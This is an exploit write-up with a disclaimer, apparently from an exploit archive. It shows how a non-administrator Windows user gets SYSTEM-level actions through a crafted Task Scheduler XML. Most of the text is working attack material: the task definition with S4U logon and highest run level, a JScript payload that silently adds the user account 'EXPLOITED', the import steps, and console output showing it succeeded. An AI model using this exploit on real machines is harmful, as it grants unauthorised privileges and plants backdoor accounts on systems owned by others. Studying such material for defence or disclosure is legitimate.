  Local SYSTEM Privilege Escalation

  Todor Donev <todor.donev@gmail.com>
  https://www.ethical-hacker.org/
  https://www.facebook.com/ethicalhackerorg

  Disclaimer:
  purpose ONLY. Do not use it without permission.
  The usual disclaimer applies, especially the
  fact that Todor Donev is not liable for any
  damages caused by direct or indirect use of the
  information or functionality provided by these
  programs. The author or any Internet provider
  bears NO responsibility for content or misuse
  of these programs or any derivatives thereof.
  By using these programs you accept the fact
  that any damage (dataloss, system crash,
  system compromise, etc.) caused by the use
  of these programs is not Todor Donev&#039;s
  responsibility.

  Use them at your own risk!

  Related exploit: 
  https://www.exploit-db.com/exploits/35850/


C:\Users\test\Desktop>net user

User accounts for \\ETHACK-PC

-------------------------------------------------------------------------------
Administrator            Guest                    test
The command completed successfully.


C:\Users\test\Desktop>net user EXPLOITED /add
System error 5 has occurred.

Access is denied.


C:\Users\test\Desktop>

The user &#039;test&#039; has no privileges to add user.
Okey! Let&#039;s hacking..

Now, we must create suidshell!

C:\Users\test\Desktop>type w00tw00t.xml

<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>1337-01-01T13:37:07.9601296</Date>
    <Author>NT-AUTHORITY\SYSTEM</Author>
  </RegistrationInfo>
  <Triggers />
  <Principals>
    <Principal id="Author">
      <UserId>ETHACK-PC\test</UserId>
      <LogonType>S4U</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>%USERPROFILE%\Desktop\EXPLOIT.JS</Command>
    </Exec>
  </Actions>
</Task>

C:\Users\test\Desktop>type EXPLOIT.JS

suidshell = WScript.CreateObject("WScript.Shell");
suidshell.run("cmd.exe /c net user EXPLOITED EXPLOITED /add", 0);


Okey. Now, our PAYLOAD is ready for IMPORT in Task Scheduler v1.0

Run &#039;taskschd.msc&#039; -> Import Task.. -> Select and Open: w00tw00t.xml -> Run


C:\Users\test\Desktop>net user

User accounts for \\ETHACK-PC

-------------------------------------------------------------------------------
Administrator            EXPLOITED                Guest
test
The command completed successfully.


C:\Users\test\Desktop>

OWNED.. I&#039;ve got the powah.. :))

